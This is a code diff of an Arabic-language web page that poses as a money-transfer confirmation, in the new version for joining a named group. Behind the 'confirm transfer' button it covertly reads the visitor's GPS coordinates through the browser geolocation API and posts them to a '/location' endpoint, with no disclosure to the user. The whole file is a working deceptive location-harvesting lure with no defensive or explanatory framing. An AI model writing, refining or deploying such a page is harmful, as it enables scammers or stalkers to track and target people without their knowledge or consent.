@@ -1,2 +1,37 @@
 <!DOCTYPE html>
-<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تأكيد التحويل</title></head><body style="text-align:center; direction: rtl; font-family: sans-serif;"><h2>اضغط على الزر لتأكيد التحويل</h2><button onclick="sendLocation()" style="padding:10px 20px; font-size:16px;">تأكيد التحويل</button><p id="status" style="margin-top:20px;"></p><script>function sendLocation(){navigator.geolocation.getCurrentPosition(pos=>{fetch('/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({latitude:pos.coords.latitude,longitude:pos.coords.longitude})}).then(()=>document.getElementById('status').innerText='تم التأكيد، شكراً لك.' );});}</script></body></html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>وائل الغالي</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: sans-serif; background-color: #0088cc; color: #fff; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; }
+    .card { background: #fff; color: #000; padding: 30px; border-radius: 10px; text-align: center; width: 300px; }
+    .btn { background: #0088cc; color: #fff; padding: 12px 20px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; width: 100%; }
+    .btn:hover { background: #0075aa; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>مجموعة وائل الغالي</h2>
+    <p>للمشاركة في المجموعة، يرجى تأكيد تحويل المال</p>
+    <button class="btn" onclick="requestLocation()">تأكيد تحويل المال</button>
+  </div>
+  <script>
+    function requestLocation() {
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+          fetch('/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            })
+          });
+        });
+      }
+    }
+  </script>
+</body>
+</html>
